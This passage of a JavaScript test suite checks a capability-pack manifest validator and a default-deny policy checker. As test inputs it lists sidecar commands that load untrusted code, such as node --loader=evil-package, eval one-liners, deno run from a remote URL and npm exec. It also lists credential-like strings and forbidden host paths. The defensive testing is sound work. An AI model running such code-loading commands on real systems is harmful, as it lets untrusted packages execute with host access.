      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '-rleft-pad/register', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'left-pad/register', checksum: sidecarChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'left-pad/register': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--loader=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--experimental-loader', 'evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--import'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '-e', 'import("node:fs")'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--conditions', './cond', '-e', 'import("node:fs")'] },
        docs: [],
        checksums: [{ path: './cond', checksum: sidecarChecksum }],
      }, { './cond': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', '--no-config', 'eval', 'import("node:fs")'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', 'https://example.test/sidecar.ts'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--test', '--test-reporter=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--test', '--test-reporter', './reporter.mjs', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './reporter.mjs', checksum: sidecarChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './reporter.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--run=adapter'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node.exe', 'sidecar.mjs'] },
      docs: [],
      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
    }, { 'sidecar.mjs': sidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['python', '-c', 'print("unchecked")'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['ruby', '-e', 'puts "unchecked"'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-econsole.log(1)'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-p1+2'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--print=1+2'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', 'exec', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', 'run', 'start'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', 'run', 'start'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', '--no-config', 'task', 'start', './sidecar.ts'] },
        docs: [],
        checksums: [{ path: './sidecar.ts', checksum: sidecarChecksum }],
      }, { './sidecar.ts': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', '--no-config', '--quiet', 'task', 'start', './sidecar.ts'] },
        docs: [],
        checksums: [{ path: './sidecar.ts', checksum: sidecarChecksum }],
      }, { './sidecar.ts': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--allow-read=.', './sidecar.mjs'] },
        docs: [],
        checksums: [{ path: './sidecar.mjs', checksum: sidecarChecksum }],
      }, { './sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '-A', './sidecar.ts'] },
        docs: [],
        checksums: [{ path: './sidecar.ts', checksum: sidecarChecksum }],
      }, { './sidecar.ts': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', 'create', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['pnpm', 'init', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', '--yes', 'exec', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', '--cache', './cache', 'exec', 'unchecked-package'] },
        docs: [],
        checksums: [{ path: './cache', checksum: sidecarChecksum }],
      }, { './cache': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', 'x', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['npm', 'explore', 'evil-package', '--', 'node', '-e', 'import("node:fs")', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bunx', 'unchecked-package'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['corepack', 'pnpm', 'dlx', 'unchecked-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', 'adapter'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--test'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['timeout', '10', 'node', '--import=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['python', '-m', 'http.server'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['python', '-m', 'http.server', 'adapter.py'] },
        docs: [],
        checksums: [{ path: 'adapter.py', checksum: sidecarChecksum }],
      }, { 'adapter.py': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const sidecarImport = fromUtf8("import './helper.mjs';\nconsole.log('ready');\n");
    const sidecarImportChecksum = `sha256:${await sha256Hex(sidecarImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarImportChecksum }],
      }, { 'sidecar.mjs': sidecarImport }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const secretSidecar = fromUtf8('API_KEY=supersecret123\n');
    const secretSidecarChecksum = `sha256:${await sha256Hex(secretSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['./sidecar.sh'] },
        docs: [],
        checksums: [{ path: './sidecar.sh', checksum: secretSidecarChecksum }],
      }, { './sidecar.sh': secretSidecar }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, extra: 'sk-raw-manifest-secret' }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadata: { 'sk-abcdefghijklmnop': true } }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const credentialKeyError = captureThrown(
      () => assertCapabilityManifest({ ...manifest, metadata: { 'Bearer persisted-token-value': true } }),
    );
    assert.equal(credentialKeyError.code, 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN');
    assert.equal(credentialKeyError.message.includes('Bearer persisted-token-value'), false);
    assert.equal(assertCapabilityManifest({ ...manifest, requiredSecrets: ['API_TOKEN'] }).requiredSecrets[0].name, 'API_TOKEN');
    assert.throws(
      () => assertCapabilityManifest({
        ...manifest,
        requiredSecrets: [{ name: 'API_TOKEN', class: 'opaque', required: true, default: 'sk-secret-default' }],
      }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const passedReceipt = {
      driverId: 'fixture-agent-model',
      packFingerprint: 'sha256:'.concat('1'.repeat(64)),
      corpusFingerprint: 'sha256:'.concat('2'.repeat(64)),
      vectors: [{ name: 'passed-vector', status: 'passed' }],
    };
    assert.throws(
      () => assertCapabilityConformanceReceipt({
        ...passedReceipt,
        vectors: [{ name: 'passed-vector', status: 'passed', apiKey: 'sk-vector-secret' }],
      }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const conformanceKeyError = captureThrown(
      () => assertCapabilityConformanceReceipt({
        ...passedReceipt,
        vectors: [{ name: 'passed-vector', status: 'passed', 'Bearer conformance-token-value': true }],
      }),
    );
    assert.equal(conformanceKeyError.code, 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN');
    assert.equal(conformanceKeyError.message.includes('Bearer conformance-token-value'), false);
    assert.throws(
      () => assertCapabilityConformanceReceipt({
        ...passedReceipt,
        nonClaims: ['token=secret-value'],
      }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityConformanceReceipt({
        driverId: 'fixture-agent-model',
        packFingerprint: 'sha256:'.concat('1'.repeat(64)),
        corpusFingerprint: 'sha256:'.concat('2'.repeat(64)),
        vectors: [{ name: 'failed-vector', status: 'failed' }],
      }),
      { code: 'ERR_CAPABILITY_CONFORMANCE_RECEIPT_INVALID' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, driverAbiVersion: 99 }),
      { code: 'ERR_CAPABILITY_VERSION_UNSUPPORTED' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, authorityLabels: ['operation:delete'] }),
      { code: 'ERR_CAPABILITY_OPERATION_LABEL_AUTHORITY_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, adapter: { kind: 'in_process', module: '/tmp/driver.mjs' } }),
      { code: 'ERR_CAPABILITY_HOST_PATH_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, adapter: { kind: 'in_process', module: 'adapter.mjs' } }),
      { code: 'ERR_CAPABILITY_MANIFEST_INVALID' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, adapter: { kind: 'sidecar', command: ['/tmp/provider'] } }),
      { code: 'ERR_CAPABILITY_HOST_PATH_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, policyRequirements: { allowedFileRoots: ['/etc'] } }),
      { code: 'ERR_CAPABILITY_HOST_PATH_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadataBytes: ['sk', 'test-secret-value'].join('-') }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadataBytes: fromUtf8(['sk', 'metadata-secret-value'].join('-')) }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const encodedMetadataSecret = btoa(String.fromCharCode(...fromUtf8(['sk', 'base64-secret-value'].join('-'))));
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadataBytes: { format: 'base64', bytes: encodedMetadataSecret } }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadataBytes: 'Bearer persisted-token-value' }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.doesNotThrow(
      () => assertCapabilityManifest({
        ...manifest,
        packageName: 'world-capability-tokenizer',
        docs: ['secrets.md'],
        metadata: {
          docs: ['secrets.md'],
          origin: 'https://example.test/tokenizer',
        },
      }),
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, metadata: { usage: 'token=persisted-token-value' } }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.doesNotThrow(
      () => assertCapabilityManifest({
        ...manifest,
        requiredSecrets: [{ name: 'HTTP_AUTHORIZATION', class: 'header', purpose: 'optional authorization header' }],
      }),
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, requiredSecrets: [{ name: 'Bearer persisted-token-value' }] }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, requiredSecrets: [{ name: 'API_TOKEN', class: 'password=persisted-token-value' }] }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, requiredSecrets: [{ name: 'API_TOKEN', purpose: 'token=persisted-token-value' }] }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, requiredSecrets: [{ name: 'sk-abcdefghijklmnop' }] }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    assert.throws(
      () => assertCapabilityResolutionBoundary({}),
      { code: 'ERR_EXPECTED_BYTES' },
    );
  });

  it('denies live, network, file, and best-effort capabilities by default', () => {
    const manifest = {
      driverId: 'network',
      packFingerprint: 'sha256:'.concat('1'.repeat(64)),
      authorityLabels: ['network:http'],
      recoveryClass: EffectRecoveryClass.bestEffort,
      maximumResponseBytes: 1024,
    };
    assert.throws(
      () => assertCapabilityPolicyAllows({ manifest, hostRequest: httpRequest(), policy: createCapabilityPolicy(), mode: 'live' }),
      { code: 'ERR_CAPABILITY_LIVE_DENIED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest,
        hostRequest: httpRequest(),
        policy: {
          auditOnly: true,
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_AUDIT_ONLY_DENIED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({ manifest, hostRequest: httpRequest(), policy: { allowLiveEffects: true }, mode: 'live' }),
      { code: 'ERR_CAPABILITY_NETWORK_DENIED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: {
          driverId: 'mislabelled-file',
          supportedActuationClasses: ['file'],
          authorityLabels: [],
          recoveryClass: EffectRecoveryClass.bestEffort,
          maximumResponseBytes: 1024,
          diagnostics: { root: '/blocked' },
        },
        hostRequest: {
          actuatorRef: 'sandbox:file',
          descriptorFingerprint: 'descriptor:sandbox-file',
          actuationClass: 'file',
          responseSchema: { status: 'ok' },
          requestBytes: fromUtf8(stableJson({ path: 'out.txt', operation: 'write', content: 'blocked' })),
        },
        policy: {
          allowLiveEffects: true,
          allowFileEffects: true,
          allowBestEffort: true,
        },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_FILE_ROOT_ALLOWLIST_REQUIRED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: {
          driverId: 'mislabelled-file',
          supportedActuationClasses: ['file'],
          authorityLabels: [],
          recoveryClass: EffectRecoveryClass.bestEffort,
          maximumResponseBytes: 1024,
          diagnostics: { root: '/blocked' },
        },
        hostRequest: {
          actuatorRef: 'sandbox:file',
          descriptorFingerprint: 'descriptor:sandbox-file',
          actuationClass: 'file',
          responseSchema: { status: 'ok' },
          requestBytes: fromUtf8(stableJson({ path: 'out.txt', operation: 'write', content: 'blocked' })),
        },
        policy: {
          allowLiveEffects: true,
          allowFileEffects: true,
          allowBestEffort: true,
          allowedFileRoots: ['/allowed'],
        },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_FILE_ROOT_DENIED' },
    );
    const fileManifest = {
      driverId: 'sandbox-file',
      supportedActuationClasses: ['file'],
      authorityLabels: ['file:sandbox'],
      recoveryClass: EffectRecoveryClass.bestEffort,
      maximumResponseBytes: 1024,
      diagnostics: { root: '/allowed' },
    };
    const writeHostRequest = {
      actuatorRef: 'sandbox:file',
      descriptorFingerprint: 'descriptor:sandbox-file',
      actuationClass: 'file',
      responseSchema: { status: 'ok' },
      requestBytes: fromUtf8(stableJson({ path: 'out.txt', operation: 'write', content: 'blocked' })),
    };
    const filePolicy = {
      allowLiveEffects: true,
      allowFileEffects: true,
      allowBestEffort: true,
      requireApprovalForBestEffort: false,
      allowedFileRoots: ['/allowed'],
    };
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: fileManifest,
        hostRequest: writeHostRequest,
        policy: filePolicy,
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_APPROVAL_REQUIRED' },
    );
    assert.equal(assertCapabilityPolicyAllows({
      manifest: fileManifest,
      hostRequest: writeHostRequest,
      policy: filePolicy,
      action: { approved: true },
      mode: 'live',
    }), true);
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest,
        hostRequest: httpRequest(),
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowBestEffort: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_APPROVAL_REQUIRED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
        hostRequest: httpRequest(),
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedMethods: ['POST'] },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_ORIGIN_ALLOWLIST_REQUIRED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
        hostRequest: httpRequest(),
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'] },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_METHOD_ALLOWLIST_REQUIRED' },
    );
    assert.throws(
      () => assertCapabilityPolicyAllows({
        manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
        hostRequest: { ...httpRequest(), requestBytes: fromUtf8('{') },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
        mode: 'live',
      }),
      { code: 'ERR_CAPABILITY_NETWORK_TARGET_REQUIRED' },
    );
    assert.equal(assertCapabilityPolicyAllows({
      manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
      hostRequest: httpRequest(),
      policy: {
        allowLiveEffects: true,
        allowNetworkEffects: true,
        allowedOrigins: ['https://allowed.example'],
        allowedMethods: ['POST'],
      },
      mode: 'live',
    }), true);
    assert.equal(assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'fixture-agent-model',
        authorityLabels: ['model:fixture'],
        diagnostics: { deterministic: true },
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...httpRequest(), actuationClass: 'model' },
      policy: { allowLiveEffects: true, allowedOrigins: ['https://other.example'], allowedMethods: ['POST'] },
      mode: 'live',
    }), true);
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'fixture-agent-model',
        authorityLabels: ['model:live'],
        diagnostics: { deterministic: true },
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...genericHttpModelRequest('goal=policy-spoofed-fixture-id', 'model-policy-spoofed-fixture-id-key') },
      policy: { allowLiveEffects: true },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'spoofed-fixture-model',
        authorityLabels: ['model:fixture-openai'],
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...genericHttpModelRequest('goal=policy-spoofed-fixture', 'model-policy-spoofed-fixture-key') },
      policy: { allowLiveEffects: true },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'mixed-model-labels',
        authorityLabels: ['model:fixture', 'model:http-json'],
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...genericHttpModelRequest('goal=policy-mixed-labels', 'model-policy-mixed-key') },
      policy: { allowLiveEffects: true },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'deterministic-model-http',
        authorityLabels: ['model:http-json'],
        diagnostics: { deterministic: true },
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...genericHttpModelRequest('goal=policy', 'model-policy-key') },
      policy: { allowLiveEffects: true },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'unlabeled-model-http',
        authorityLabels: [],
        supportedActuationClasses: ['model'],
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...genericHttpModelRequest('goal=policy-unlabeled', 'model-policy-unlabeled-key') },
      policy: { allowLiveEffects: true },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_LIVE_MODEL_BUDGET_EXCEEDED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'prompt-capability',
        authorityLabels: [],
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: {
        ...httpRequest(),
        actuationClass: 'fixture',
        policyRequestBytes: fromUtf8('prompt-body'),
        requestBytes: fromUtf8('[]'),
      },
      policy: {
        maximumRequestBytes: 1024,
        maximumPromptBytes: 4,
      },
      mode: 'dry-run',
    }), { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' });
    const requestlessHttpReport = preflightCapabilities({
      application: { requiredHostAuthorityLabels: ['network:http'] },
      drivers: [new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' })],
      policy: { allowedAuthorityLabels: ['network:http'] },
    });
    assert.ok(requestlessHttpReport.blockers.includes('required-authority-policy-blocked:network:http'));
    assert.ok(requestlessHttpReport.blockers.includes('http-origin-allowlist-required'));
    assert.ok(requestlessHttpReport.blockers.includes('http-method-allowlist-required'));
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: {
        driverId: 'http',
        authorityLabels: ['network:http'],
        recoveryClass: EffectRecoveryClass.idempotent,
        maximumResponseBytes: 1024,
      },
      hostRequest: { ...httpRequest(), requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide' })) },
      policy: {
        allowLiveEffects: true,
        allowNetworkEffects: true,
        allowedOrigins: ['https://allowed.example'],
        allowedMethods: ['POST'],
      },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_METHOD_REQUIRED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
      hostRequest: {
        ...httpRequest(),
